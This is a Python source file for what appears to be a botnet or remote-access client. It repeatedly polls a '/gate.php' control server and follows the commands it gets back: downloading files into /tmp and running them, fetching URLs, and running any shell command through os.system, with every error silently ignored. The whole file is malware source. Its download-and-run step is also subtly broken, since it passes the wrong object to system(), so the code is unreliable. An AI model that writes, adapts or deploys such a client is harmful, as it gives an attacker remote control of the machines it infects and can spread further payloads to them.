from os import system
from time import sleep
from random import randint

_ver = 0

_scheme = "http://"
_host = "localhost"
_gate = "/gate.php"

_sleep = 10
_save = '/tmp'
_ext = ['exe', 'run', 'sh', 'php', 'bat']

try:
    from urllib2 import urlopen
    _ver = 2
except:
    try:
        from urllib3 import PoolManager, request
        _ver = 3
    except:
        try:
            from urllib.request import urlretrieve as urlopen
            _ver = 1
        except:
            import socket

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((_host, 80))
            s.send(bytes("GET /false.php HTTP/1.1\nHost: {0}\n\n".format(_host), 'utf8'))
            s.close()

            exit()

def _ext_check(link):
    lnk = link.split('.')

    if len(lnk) > 2:
        lnk = lnk[len(lnk)-1]

        if '/' not in lnk:
            if lnk in _ext:
                return '.'+lnk
    
    return ''

def receive(link, need=True):
    _cmd = ''

    try:
        if _ver == 1:
            r = urlopen(link)

            if need:
                _cmd = r.read().decode('utf-8')
        elif _ver == 2:
            r = urlopen(link)

            if need:
                _cmd = r.read().decode('utf-8')
        else:
            c = PoolManager()
            r = c.request('GET', link, preload_content=False)

            if need:
                _cmd = r.read(decode_content=True)

            r.release_conn()
    except:
        pass

    return _cmd

def dwld_exec(link, agr):
    try:
        _tmp = _save + '/my_file-{0}{1}'.format(randint(0,10000), _ext_check(link))

        if _ver == 1:
            _tmp2 = urlopen(link, _tmp)
        elif _ver == 2:
            _tmp2 = urlopen(link)
            _path = open(_tmp, 'wb').write(_tmp2.read())
        else:
            c = PoolManager()
            r = c.request('GET', link, preload_content=False)
            
            with open(_tmp, 'wb') as out:
                while True:
                    data = r.read(1000000)

                    if not data:
                        break

                    out.write(data)
            
            r.release_conn()

        system(_tmp2 + ' ' + agr)
    except:
        pass

    return ''

if __name__ == "__main__":
    while True:
        tmp = receive(_scheme+_host+_gate).split("||")

        if tmp[0] == "d&e":
            dwld_exec(tmp[1], '')
        elif tmp[0] == "o_s":
            receive(tmp[1], False)
        elif tmp[0] == "de&agr":
            dwld_exec(tmp[1], tmp[2])
        elif tmp[0] == "sys":
            try:
                system(tmp[1])
            except:
                pass

        sleep(_sleep)
